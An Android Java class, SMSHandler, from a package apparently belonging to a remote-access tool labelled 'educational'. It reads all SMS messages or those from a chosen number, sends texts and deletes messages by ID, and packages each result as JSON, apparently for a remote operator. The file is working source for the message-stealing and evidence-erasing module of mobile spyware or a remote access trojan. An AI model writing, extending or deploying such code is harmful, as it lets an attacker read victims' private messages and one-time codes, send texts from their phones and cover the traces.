package com.remoteaccess.educational.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * SMS Handler - Read and Send SMS
 */
public class SMSHandler {

    private Context context;

    public SMSHandler(Context context) {
        this.context = context;
    }

    /**
     * Get all SMS messages
     */
    public JSONObject getAllSMS(int limit) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[] { "_id", "address", "body", "date", "type", "read" };
            
            Cursor cursor = context.getContentResolver().query(
                uri, 
                projection, 
                null, 
                null, 
                "date DESC LIMIT " + limit
            );

            JSONArray smsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type"))); // 1=inbox, 2=sent
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("messages", smsList);
            result.put("count", smsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get SMS from specific number
     */
    public JSONObject getSMSFromNumber(String phoneNumber, int limit) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[] { "_id", "address", "body", "date", "type", "read" };
            String selection = "address = ?";
            String[] selectionArgs = new String[] { phoneNumber };
            
            Cursor cursor = context.getContentResolver().query(
                uri, 
                projection, 
                selection, 
                selectionArgs, 
                "date DESC LIMIT " + limit
            );

            JSONArray smsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("phoneNumber", phoneNumber);
            result.put("messages", smsList);
            result.put("count", smsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Send SMS
     */
    public JSONObject sendSMS(String phoneNumber, String message) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "SEND_SMS permission not granted");
                return result;
            }

            SmsManager smsManager = SmsManager.getDefault();
            
            // Split message if too long
            if (message.length() > 160) {
                java.util.ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }

            result.put("success", true);
            result.put("message", "SMS sent successfully");
            result.put("to", phoneNumber);
            result.put("text", message);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Delete SMS by ID
     */
    public JSONObject deleteSMS(String smsId) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/" + smsId);
            int deleted = context.getContentResolver().delete(uri, null, null);

            result.put("success", deleted > 0);
            result.put("message", deleted > 0 ? "SMS deleted" : "SMS not found");
            result.put("smsId", smsId);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }
}
